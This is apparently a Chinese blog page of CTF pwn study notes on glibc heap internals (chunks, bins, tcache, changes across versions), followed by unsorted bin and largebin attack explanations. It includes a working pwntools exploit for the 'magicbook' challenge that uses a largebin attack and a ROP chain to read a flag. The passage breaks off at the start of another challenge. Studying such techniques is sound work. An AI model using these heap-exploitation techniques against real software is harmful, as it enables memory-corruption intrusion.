@@ -1,0 +1,3274 @@
+<!DOCTYPE html><html lang="zh-Hans"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>模板 | 沉于思，录以隙</title><meta name="description" content="# 模板 ```py from pwn import * context(os='linux', arch='amd64', log_level='debug') file_name = &#34;./pwn&#34; e = ELF(file_name) lib = './' select=0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600;700&family=Zhi+Mang+Xing&family=Noto+Serif+SC:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"><script>
+      (() => {
+        try {
+          const saved = localStorage.getItem("theme");
+          const theme = saved === "dark" || saved === "light"
+            ? saved
+            : (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+          document.documentElement.setAttribute("data-theme", theme);
+        } catch {
+          document.documentElement.setAttribute("data-theme", "light");
+        }
+      })();
+    </script><link rel="stylesheet" href="/_astro/_folder_.vzbGpqN6.css"></head> <body class="is-post-page"> <header class="topbar topbar-post"> <a class="brand" href="/">沉于思，录以隙</a> <nav class="nav-links"> <a href="/" class>首页</a> <a href="/folders" class>目录</a> <a href="/tags" class>标签</a> <a href="/#archive-search">搜索</a> <button id="theme-toggle" type="button" aria-label="切换主题"> <span class="theme-icon theme-sun">☀</span> <span class="theme-icon theme-moon">☾</span> </button> </nav> </header> <main id="main-content" class="page-shell page-main is-post-main">  <section class="post-cover-hero" style="background-image: url('/hero-bg.jpg')"> <div class="post-cover-hero__overlay"></div> <div class="post-cover-hero__inner"> <p class="post-cover-hero__eyebrow">二进制</p> <h1 class="post-cover-hero__title">模板</h1> </div> </section> <div class="article-shell article-shell--toc-collapsed" id="article-shell"> <a class="back-link" href="/">&larr; 返回首页花园</a> <div class="article-layout"> <article class="article-panel"> <header class="article-header"> <div class="article-directory"> <a href="/folders" class="directory-link">目录</a>  <span class="directory-sep">/</span> <a href="/folders/二进制/" class="directory-link">二进制</a>   <span class="directory-sep">/</span> <span class="directory-text">pwn</span>  </div> <div class="article-meta-row"> <span>2025/12/12</span> <span>二进制</span>  </div> <div class="tag-row article-header__tags">  </div> <p class="source-note">来源路径：二进制/pwn/堆.md</p> </header> <div class="article-main"> <div class="article-content"><h1>模板</h1><pre><code class="language-py">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+file_name = &quot;./pwn&quot;
+e = ELF(file_name)
+lib = &#39;./&#39;
+select=0
+if select == 0:
+    p=process(file_name)
+    libc = ELF(lib)
+else:
+    p=remote(&#39;&#39;)
+    libc = ELF(lib)
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+ru = lambda s : p.recvuntil(s)
+it = lambda : p.interactive()
+
+def choice(idx):
+    sla(&#39;\n&#39;,str(idx))
+
+def add(idx,size):
+    choice(1)
+    sla(&#39;&#39;,str(idx))
+    sla(&#39;&#39;,str(size))    
+def delete():
+    choice(2)
+    
+def show(idx):
+    choice(3)
+    sa(&#39;\n&#39;,str(idx))
+    
+def edit(idx,content):
+    choice(4)
+    sa(&quot;\n&quot;,str(idx))
+    sd(content)
+                          
+it()
+</code></pre>
+<h1>技巧</h1><p>largebin的fd_next和bk_next可以泄露heap_base</p>
+<h1>malloca &amp; free</h1><h2 id="section-1">arena</h2><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240221121925471.png" alt="image-20240221121925471"></p>
+<h2 id="section-2">malloca过程</h2><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508220851648.png" alt="image-20240508220851648"></p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508220907514.png" alt="image-20240508220907514"></p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508221002518.png" alt="image-20240508221002518"></p>
+<h2 id="section-3">free过程</h2><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508221111901.png" alt="image-20240508221111901"></p>
+<h1>chunk结构</h1><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240221123150999.png" alt="image-20240221123150999"></p>
+<p>通俗地说，一块由分配器分配的内存块叫做一个 chunk，包含了元数据和用户数据。具体一点，chunk 完整定义如下：</p>
+<pre><code class="language-c">struct malloc_chunk {
+  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
+  struct malloc_chunk* fd;                /* 这两个指针只在free chunk存在 */
+  struct malloc_chunk* bk;
+  /* 只在large bin 存在.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+};
+
+typedef struct malloc_chunk* mchunkptr;
+</code></pre>
+<p>这里出现的6个字段均为元数据。</p>
+<h3 id="section-4">Allocated chunk</h3><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240214214225707.png" alt="image-20240214214225707"></p>
+<p>第一个部分（32 位上 4字节，64 位上 8字节）叫做<code>prev_size</code>，只有在前一个 chunk 空闲（free）时（tcache中的不算）才表示前一个块的大小，否则这里就是无效的，可以被前一个块征用（存储用户数据）。</p>
+<blockquote>
+<p>这里的前一个chunk，指内存中相邻的前一个，而不是freelist链表中的前一个。<code>PREV_INUSE</code>代表的“前一个chunk”同理。</p>
+</blockquote>
+<p>第二个部分的高位存储当前 chunk 的大小，低 3 位分别表示：</p>
+<ul>
+<li>P: 之前的 chunk 已经被分配则为 1，</li>
+<li>M:  当前 chunk 是<code>mmap()</code>得到的则为 1</li>
+<li>N: <code>NON_MAIN_ARENA</code> 当前 chunk 在<code>non_main_arena</code>里则为 1</li>
+</ul>
+<p>你可能会有几个困惑：</p>
+<ol>
+<li><p><code>fd</code>、<code>bk</code>、<code>fd_nextsize</code>、<code>bk_nextsize</code>这几个字段去哪里了？
+对于已分配的 chunk 来说它们没用，所以也被征用了，用来存储用户数据。</p>
+</li>
+<li><p>为什么第二个部分的低 3 位就这么被吞了而不会影响<code>size</code>？
+这是因为<code>malloc</code>会将用户申请的内存大小转化为实际分配的内存，以此来满足（至少）8字节对齐的要求，同时留出额外空间存放 chunk 头部。由于（至少）8字节对齐了，低3位自然就没用了。在获取真正的<code>size</code>时，会忽略低3位：</p>
+</li>
+</ol>
+<pre><code class="language-c">/*
+   Bits to mask off when extracting size
+
+   Note: IS_MMAPPED is intentionally not masked off from size field in
+   macros for which mmapped chunks should never be seen. This should
+   cause helpful core dumps to occur if it is tried by accident by
+   people extending or adapting this malloc.
+ */
+#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
+
+/* Get size, ignoring use bits */
+#define chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))
+</code></pre>
+<ol start="4">
+<li>这里还有一个<code>mem</code>指针，是做什么用的？
+这是调用<code>malloc</code>时返回给用户的指针。实际上，真正的chunk 是从<code>chunk</code>指针开始的。</li>
+</ol>
+<pre><code class="language-c">/* The corresponding word size */
+#define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))
+
+/* conversion from malloc headers to user pointers, and back */
+
+#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
+#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
+</code></pre>
+<ol start="5">
+<li>用户申请的内存大小就是用户数据可用的内存大小吗？
+不一定，原因还是字节对齐问题。要获得可用内存大小，可以用<code>malloc_usable_size()</code>获得，其核心函数是：</li>
+</ol>
+<pre><code class="language-c">static size_t
+musable (void *mem)
+{
+  mchunkptr p;
+  if (mem != 0)
+    {
+      p = mem2chunk (mem);
+
+      if (__builtin_expect (using_malloc_checking == 1, 0))
+        return malloc_check_get_size (p);
+
+      if (chunk_is_mmapped (p))
+        return chunksize (p) - 2 * SIZE_SZ;
+      else if (inuse (p))
+        return chunksize (p) - SIZE_SZ;
+    }
+  return 0;
+}
+</code></pre>
+<h3 id="section-5">Free chunk</h3><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240214220311611.png" alt="image-20240214220311611"></p>
+<p>首先，<code>prev_size</code>必定存储上一个块的用户数据，因为 Free chunk 的上一个块必定是 Allocated chunk，否则会发生合并。</p>
+<p>接着，多出来的<code>fd</code>指向同一个 bin 中的前一个 Free chunk，<code>bk</code>指向同一个 bin 中的后一个 Free chunk。</p>
+<p>这里提到了 bin，我们将在后面介绍。</p>
+<p>此外，对于 large bins 中的 Free chunk，<code>fd_nextsize</code>与<code>bk_nextsize</code>会生效，分别指向 large bins 中前一个（更大的）和后一个（更小的）空闲块。</p>
+<h3 id="section-6">Top chunk</h3><p>一个<code>arena</code>顶部的 chunk 叫做 Top chunk，它不属于任何 bin。当所有 bin 中都没有空闲的可用 chunk 时，我们切割 Top chunk 来满足用户的内存申请。假设 Top chunk 当前大小为 N 字节，用户申请了 K 字节的内存，那么 Top chunk 将被切割为：</p>
+<ul>
+<li>一个 K 字节的 chunk，分配给用户</li>
+<li>一个 N-K 字节的 chunk，称为 Last Remainder chunk</li>
+</ul>
+<p>后者成为新的 Top chunk。如果连 Top chunk 都不够用了，那么：</p>
+<ul>
+<li>在<code>main_arena</code>中，用<code>brk()</code>扩张 Top chunk</li>
+<li>在<code>non_main_arena</code>中，用<code>mmap()</code>分配新的堆</li>
+</ul>
+<blockquote>
+<p>注：Top chunk 的 PREV_INUSE 位总是 1</p>
+</blockquote>
+<h3 id="section-7">Last Remainder chunk</h3><p>当需要分配一个比较小的 K 字节的 chunk 但是 small bins 中找不到满足要求的，且 Last Remainder chunk 的大小 N 能满足要求，那么 Last Remainder chunk 将被切割为：</p>
+<ul>
+<li>一个 K 字节的 chunk，分配给用户</li>
+<li>一个 N-K 字节的 chunk，成为新的 Last Remainder chunk</li>
+</ul>
+<p>它的存在使得连续的小空间内存申请，分配到的内存都是相邻的，从而达到了更好的局部性。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508215913728.png" alt="image-20240508215913728"></p>
+<h1>bin结构</h1><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508214438337.png" alt="image-20240508214438337"></p>
+<h3 id="section-8">fastbins</h3><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508214706124.png" alt="image-20240508214706124"></p>
+<h3 id="section-9">small bins</h3><p>  small bins 中一共有 62 个循环双向链表，每个链表中存储的 chunk 大小都一致。比如对于 32 位系统来说，下标 2 对应的双向链表中存储的 chunk 大小为均为 16 字节。每个链表都有链表头结点，这样可以方便对于链表内部结点的管理。此外，<strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则</strong>，所以同一个链表中先被释放的 chunk 会先被分配出去。</p>
+<p><strong>或许，大家会很疑惑，那 fastbin 与 small bin 中 chunk 的大小会有很大一部分重合啊，那 small bin 中对应大小的 bin 是不是就没有什么作用啊？</strong> 其实不然，fast bin 中的 chunk 是有可能被放到 small bin 中去的，我们在后面分析具体的源代码时会有深刻的体会。</p>
+<h3 id="section-10">unsorted bins</h3><p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240508215406461.png" alt="image-20240508215406461"></p>
+<h3 id="section-11">large bins</h3><p>Large Bin使用来存放超过0x400大小的chunk的，但是这些链表上的chunk的大小并不一定是相同的，而是有一个范围的，比如对于0x400到0x420(仅举例)的chunk都放在第一个large bin的链表上。</p>
+<p>用 fd_nextsize 和 bk_nextsize 链接的链表为横向链表，用 fd 和 bk 链接的链表为纵向链表
+在横向链表中，堆管理器维护一个循环的单调链表，由最大的 size（在这个 index 下的最大 size）作为表头，最小的 size 作为表尾，且首尾相连
+size 最大的chunk的 bk_nextsize 指向最小的 chunk，size 最小的 chunk 的 fd_nextsize 指向最大的 chunk
+一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列</p>
+<p>插入顺序</p>
+<p>1.按照大小，从大到小排序（小的链接large bin块）
+2.如果大小相同，按照free的时间排序
+3.多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0
+4.size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240911222319882.png" alt="image-20240911222319882"></p>
+<h3 id="section-12">tcache bins</h3><p>注意：在tcachebins中地址显示的是fd处的地址，非pre_size处的，而unsortedbin是pre_size处的。和top chunk相邻释放会并入top chuk</p>
+<p>范围：最大0x410,任意大于0x90大小(即大于fastbin大小的) tcache满之后放入unsortbin</p>
+<p>​	在GLIBC2.26中，引入了一种新的bins，他类似于fastbin，但是每条链上最多可以有7个chunk，free的时候当tcache满了才放入fastbin，unsorted bin，malloc的时候优先去tcache找。
+换句话说. tcache是比fastbin优先级更高范围更大的一类bins</p>
+<pre><code>	对于tcache来说，他的free范围变大了，也就是说我们直接free一块unsorted bin大小的chunk，并不会直接进入unsorted bin而是会先进入tcache，只有对应大小的tcache满了以后，才会放入unsorted bin。
+</code></pre>
+<p>这时想要得到一个unsorted bin有以下方法：</p>
+<pre><code>1.free一个largebin，largebin不会放入tcache
+2.先连续free填满tcache，再free放进unsorted bin
+3.(2.31以后因为更新不可用)在存有uaf的时候，可以先连续free两次，再malloc三次快速填满tcache。这时因为tcache的个数是由count代表的，每申请一次就会-1且申请时并不判断count，先free两次造成double free，令next始终指向自身，这时count为2，再连续申请3次，count变为-1，而在比较时是char类型，也就是unsigned int8，-1远大干7，导致tcache认为已满
+4.打tcache_pthread_struct修改count后free
+</code></pre>
+<h1>堆中的检测机制发展</h1><p><a href="https://cn-sec.com/archives/1146599.html">各版本下libc检测机制和堆利用 | CN-SEC 中文网</a></p>
+<p>可从例题了解<a href="http://t.csdnimg.cn/rO3Xq">http://t.csdnimg.cn/rO3Xq</a></p>
+<h3 id="section-13">glibc2.23</h3><p>1.size位检测：fastbin会检测size位是否为空因此需要伪造chunk（反制手段(__malloc_hook - 0x23)）</p>
+<p>2.double free：glibc2.23对于double free的管理非常地松散，如果连续释放相同chunk的时候没问题。</p>
+<h3 id="section-14">glibc2.27</h3><p>1.自此后引入tchache机制由于tcache不检查size位，也不检查FD，只要泄露了地址，加上UAF就能实现任意申请。</p>
+<p>2.double free：加强了对use after free的检测，所以glibc2.23中针对fastbin的uaf在glibc2.27以后，就失效了。glibc2.27—ubuntu4加入了tchache的double free检测</p>
+<h3 id="section-15">glibc2.31</h3><p>1.会检查tcache的数量是否正确，要想连续add两次，就必须有两个chunk在tcache中</p>
+<h3 id="section-16">glibc2.32</h3><p>1.堆指针异或加密**(只有tcache和fastbin)**safe-linking</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240509160427894.png" alt="image-20240509160427894"></p>
+<p>2.Tcache地址对齐检查：tcache或者fastbin指向的chunk指针的最后一位必须是0（64位下），不能是8。tcache不能任意申请了</p>
+<h3 id="section-17">glibc2.35</h3><p>1.从2.34开始取消了hook机制，堆题要开始堆栈结合，利用_IO_FILE 结构体</p>
+<h1>environ（常在堆题配合打orw）</h1><p>先来介绍一下environ，在Linux C中，environ是一个全局变量，它储存着系统的环境变量。它储存在libc中，因此environ是沟通libc地址与栈地址的桥梁。</p>
+<p>environ的利用</p>
+<p>通过libc找到environ地址后，泄露environ地址处的值，可以得到环境变量地址，环境变量保存在栈中，通过偏移可以得到栈上任意变量的地址。</p>
+<h1>劫持 tcache_perthread_struct</h1><p>是heap中首个堆块，这个结构在tcache_init 函 数中被初始化在堆上，大小为 0x250（高版本为 0x290）。其中数据部分前 0x40 为counts ，剩下的为 entries 结构。如果能控制这个堆块就可以控制整个 tcache</p>
+<h1>Unsorted Bin Attack</h1><p>当将一个 unsorted bin 取出的时候，会将 <code>bck-&gt;fd</code> 的位置写入本 Unsorted Bin 的位置。</p>
+<pre><code class="language-c">/* remove from unsorted list */
+unsorted_chunks (av)-&gt;bk = bck;
+bck-&gt;fd = unsorted_chunks (av);
+</code></pre>
+<p>换而言之，如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址。通常可以利用此方法向 <code>global_max_fast</code> 写入一个较大的值，从而扩大 fast bin 范围，甚至 <code>fastbinsY</code> 数组溢出 造成任意地址写。</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/5b5f50ade0c2d907b64fd059424d9388_MD5.png" alt=""></p>
+<p>unsorted bin attack 之后，fake chunk 被链入 unsorted bin 中，此时要想将 unsorted bin 申请出来必须通过如下检查：</p>
+<ul>
+<li><p>检查 size 是否合法</p>
+<pre><code class="language-c">if(__builtin_expect (chunksize_nomask (victim) &lt;= 2 * SIZE_SZ, 0)
+  || __builtin_expect (chunksize_nomask (victim)
+     &gt; av-&gt;system_mem, 0))
+ malloc_printerr (&quot;malloc(): memory corruption&quot;);
+</code></pre>
+</li>
+<li><p>unsorted bin chunk 的 bk 字段指向的地址必须为可写</p>
+<pre><code class="language-c">/* remove from unsorted list */
+unsorted_chunks (av)-&gt;bk = bck;
+bck-&gt;fd = unsorted_chunks (av);
+</code></pre>
+<p>后续会介绍 House of Storm 利用手法，本质是在 unsorted bin attack 的基础上利用 large bin attack 进行两处任意地址写来伪造 fake chunk 的 size 和 bk ，从而将 fake chunk 申请出来。</p>
+</li>
+</ul>
+<p>不过从 glibc-2.28 开始会有如下检查，此方法失效。</p>
+<pre><code class="language-c">/* remove from unsorted list */
+if(__glibc_unlikely (bck-&gt;fd != victim))
+    malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
+</code></pre>
+<h1>largebin attack</h1><p>[常回家看看之largebin_attack_largebin范围-CSDN博客](<a href="https://blog.csdn.net/susu_xiaosu/article/details/140684345?ops_request_misc=%7B%22request%5Fid%22%3A%2215323F9C-B28D-461A-B388-B21EE9ABE837%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=15323F9C-B28D-461A-B388-B21EE9ABE837&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-140684345-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=large">https://blog.csdn.net/susu_xiaosu/article/details/140684345?ops_request_misc=%7B%22request%5Fid%22%3A%2215323F9C-B28D-461A-B388-B21EE9ABE837%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=15323F9C-B28D-461A-B388-B21EE9ABE837&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-140684345-null-null.142^v100^pc_search_result_base7&amp;utm_term=large</a> bin attack&amp;spm=1018.2226.3001.4187)</p>
+<p><a href="https://blog.csdn.net/qq_41252520/article/details/126211062?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221711a1093742e6d5e535cd368d2ad571%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=1711a1093742e6d5e535cd368d2ad571&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-126211062-null-null.14">Largebin Attack原理详解 </a></p>
+<h2 id="section-18">介绍</h2><p>攻击成效：能够向任意地址写堆地址，常配合其他攻击手法实现 getshell。</p>
+<p>【利用条件】：</p>
+<p>能够修改 Largebin 中的块的 bk_nextsize 字段。
+程序中至少能够分配三种属于 Largebin的不同大小的块。
+【利用步骤】：</p>
+<p>分配一块大小 size1 在 Largebin 范围内的块 chunk1。
+分配一块任意大小的块 pad1，主要防止在释放 chunk1 时系统将其与 top chunk合并。
+分配一块大小 size2 在 Largebin 范围内的块 chunk2，要求size2&lt;size1。
+分配一块任意大小的块 pad2，主要防止在释放 chunk2 时系统将其与 top chunk合并
+释放 chunk1，此时系统会将其放入 unsortedbin；再分配一个 size3 的块，要求size3&gt;size1，此时系统就会将 chunk1 放进 Largebin中。
+释放 chunk2进入 unsortedbin。
+修改chunk1−&gt;bk_nextsize = Target − 0x20。
+随意分配一个大小的块，就会触发Largebin attack。</p>
+<p><strong>原理</strong></p>
+<pre><code class="language-c">static void *
+_int_malloc (mstate av, size_t bytes)
+{
+  ...
+      if (!checked_request2size (bytes, &amp;nb))
+      {
+          __set_errno (ENOMEM);
+          return NULL;
+      }    
+  ...
+      for (;; )
+      {
+          int iters = 0;
+          // 如果unsortedbin不为空
+          while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))
+          {
+              // victim是当前unsortedbin中的第一个块
+              bck = victim-&gt;bk;
+              size = chunksize (victim);
+              mchunkptr next = chunk_at_offset (victim, size);
+
+              ...
+                  /* victim从unsortedbin中摘除 */
+                  if (__glibc_unlikely (bck-&gt;fd != victim))
+                      malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);
+              unsorted_chunks (av)-&gt;bk = bck;
+              bck-&gt;fd = unsorted_chunks (av);
+
+              ...
+                  /* place chunk in bin */
+                  // 判断victim的大小是否属于smallbin
+                  if (in_smallbin_range (size))
+                  {
+                      victim_index = smallbin_index (size);
+                      bck = bin_at (av, victim_index);
+                      fwd = bck-&gt;fd;
+                  }
+              else
+              {
+                  victim_index = largebin_index (size);
+                  // bck是Largebin中的第一个chunk
+                  bck = bin_at (av, victim_index);
+                  //  在Largebin中只有一个块的时候，fwd指向的是Largebin链表头
+                  fwd = bck-&gt;fd;
+
+                  /* maintain large bins in sorted order */
+                  // 如果largebin不为空，则维护largebin的顺序性（小到大）
+@48               if (fwd != bck)
+                  {
+                      /* Or with inuse bit to speed comparisons */
+                      size |= PREV_INUSE;
+                      /* if smaller than smallest, bypass loop below */
+                      assert (chunk_main_arena (bck-&gt;bk));
+                      /* 
+                        chunksize_nomask(bck-&gt;bk)取得的是Largebinbin中第一个chunk的大小
+					  size则是的unsortedbin中第一个chunk的大小
+			  		*/
+@58                   if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))
+                      {
+                          fwd = bck;
+                          bck = bck-&gt;bk;
+
+                          victim-&gt;fd_nextsize = fwd-&gt;fd;
+                          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;
+                          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;
+                      }
+                      else
+                      {
+                          ...
+                      }
+                  }
+                  else
+                      // 将victim视作largebin中的块
+                      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;
+              }
+              // 将victim放入相应的bin链表中
+@77           mark_bin (av, victim_index);
+              victim-&gt;bk = bck;
+              victim-&gt;fd = fwd;
+              fwd-&gt;bk = victim;
+              bck-&gt;fd = victim;
+              ...
+          }
+}
+</code></pre>
+<p>以上代码片段是系统根据用户请求内存分配的大小对 unsortedbin 的操作，此时只要 Largebin不为空 @line:48，并且处于 unsortedbin中的块大小属于 Largebin的范畴同时还要小于 Largebin中的块大小，就会将 unsortedbin中的块链入Largebin 对应的链表中 @line:58 和 @line:77并调整顺序。</p>
+<p>@line:60 开始就是关键操作，bck是 Largebin中的第一个块，记为 chunk1，victime是 unsortedbin中的第一个 块，记为 chunk2，假设攻击者之前已经修改成chunk1-&gt;bk_nextsize=Target-0x20，那么链入操作就变成了</p>
+<pre><code class="language-c">fwd = chunk1;
+bck = *(chunk1 + 0x18); // 在Largebin中只有一个块的时候，bck指向的是Largebin链表头
+*(chunk2 + 0x20) = *(chunk1 + 0x10); // 在Largebin中只有一个块的时候，chunk2 + 0x20指向的是Largebin链表c头
+*(chunk2 + 0x28) = *(*(chunk1 + 0x10) + 0x28); // chunk2 + 0x28指向的是Target-0x20
+*(*(chunk1 +0x10) + 0x28) =  *(*(chunk2 + 0x28) + 0x20) = chunk2; // &lt;=&gt; *(Target-0x20+0x20) = chunk2; 
+</code></pre>
+<p>结果就是 <strong>Target</strong>指向的地址被写入了 <strong>chunk2</strong>的内容，这就是 <strong>Largebin attack</strong>的核心原理！</p>
+<h2 id="section-19">例题</h2><h3 id="section-20">magicbook(libc-2.35+orw)</h3><p>exp（保护全开）</p>
+<pre><code class="language-py">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+#context.update(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+file_name = &quot;./pwn&quot;
+e = ELF(file_name)
+p= process(file_name)
+lib = &#39;./libc.so.6&#39;
+select=0
+if select == 0:
+    p=process(file_name)
+    libc = ELF(lib)
+else:
+    p=remote(&#39;&#39;)
+    libc = ELF(lib)
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+uu32 = lambda data : u32(data.ljust(4, b&#39;\x00&#39;))
+uu64 = lambda data : u64(data.ljust(8, b&#39;\x00&#39;))
+
+def add(size):
+    p.sendlineafter(&#39;Your choice:&#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;your book need?&#39;,str(size))
+ 
+ 
+def free0(index,ch,msg):
+    p.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;want to delete?&#39;,str(index))
+    p.sendlineafter(&#39;being deleted?(y/n)&#39;,&#39;y&#39;)
+    p.sendlineafter(&#39;you want to write?&#39;,str(ch))
+    p.sendafter(&#39;content: &#39;,msg)
+ 
+def free1(index):
+    p.sendlineafter(&#39;Your choice:&#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;want to delete?&#39;,str(index))
+    p.sendlineafter(&#39;being deleted?(y/n)&#39;,&#39;n&#39;)
+ 
+def edit():
+    p.sendlineafter(&#39;Your choice:&#39;,&#39;3&#39;)
+
+p.recvuntil(&#39; gift: &#39;)
+pie = int(p.recv(14),16) - 0x4010
+success(&#39;pie-----&gt;&#39;+hex(pie))
+
+book_count = 0x4050 + pie
+ret = 0x101a + pie
+pop_rdi = 0x0000000000001863  + pie # : pop rdi; ret; 
+pop_rsi = 0x0000000000001861  + pie  #: pop rsi; pop r15; ret;
+puts_plt = pie + 0x1140
+puts_got = pie + 0x3F88
+edit_book = pie + 0x15e1
+
+add(0x450) #0
+add(0x440) #1
+add(0x440) #2
+free1(0)
+add(0x498) #让0号从unsorted进入large_bin
+
+payload = p64(ret) + p64(0) + p64(book_count-0x20)
+free0(2,0,payload) #改bk_next为目标地址
+# debug()
+add(0x4f0) #直接触发了largebin attack，内容见下图
+
+
+edit()
+ru(&#39;down your story!&#39;)
+payload = b&#39;a&#39;*0x28 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(edit_book)
+sl(payload)
+ru(&#39;\n&#39;)
+libc_bass = u64(rc(6).ljust(8,b&#39;\x00&#39;)) - libc.sym[&#39;puts&#39;]
+success(&#39;libc_bass----&gt;&#39;+hex(libc_bass))
+ru(&#39;down your story!&#39;)
+
+pop_rdx_12 = 0x000000000011f2e7 + libc_bass#: pop rdx; pop r12; ret;
+pop_rax = 0x0000000000045eb0 + libc_bass#: pop rax; ret; 
+syscall = 0x0000000000091316 + libc_bass#: syscall; ret; 
+open = libc_bass + libc.sym[&#39;open&#39;]
+environ = libc_bass + libc.sym[&#39;environ&#39;] #environ存环境变量的地址
+success(&#39;environ----&gt;&#39;+hex(environ))
+read = libc_bass + libc.sym[&#39;read&#39;]
+ 
+bss=0x4090+pie
+payload = b&#39;a&#39;*0x28 + p64(pop_rdi) + p64(environ) + p64(puts_plt) + p64(edit_book)
+sl(payload)
+ru(&#39;\n&#39;)
+stack  = u64(rc(6).ljust(8,b&#39;\x00&#39;)) - 0x148 + 0x20 #是edit函数栈帧中rsp位置
+success(&#39;stack----&gt;&#39;+hex(stack))
+ru(&#39;down your story!&#39;)
+#orw
+flag = stack + 0xb8 
+payload = b&#39;a&#39;*0x28 + p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(0)*2 + p64(open) 
+payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss) +p64(0)+ p64(pop_rdx_12) + p64(0x30) + p64(0) + p64(read)
+payload += p64(pop_rdi) + p64(bss) + p64(puts_plt) 
+payload += b&#39;./flag\x00\x00&#39;
+debug()
+sl(payload)
+it()
+</code></pre>
+<p>下图中，中间地址是bookcontent-0x20地址，</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240913191208987.png" alt="image-20240913191208987"></p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20240911215932545.png" alt="image-20240911215932545"></p>
+<h1>修改内存值</h1><h4>wustctf2020_easyfast</h4><p>题干（考点：伪造一个堆块）libc2.23</p>
+<pre><code class="language-c">  char s[8]; // [rsp+0h] [rbp-20h] BYREF
+  __int64 v1; // [rsp+8h] [rbp-18h]
+  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  *(_QWORD *)s = 0LL;
+  v1 = 0LL;
+  while ( 1 )
+  {
+    puts(&quot;choice&gt;&quot;);
+    fgets(s, 8, stdin);
+    switch ( atoi(s) )
+    {
+      case 1:
+        sub_400916();                           // add 最多4个
+        break;
+      case 2:
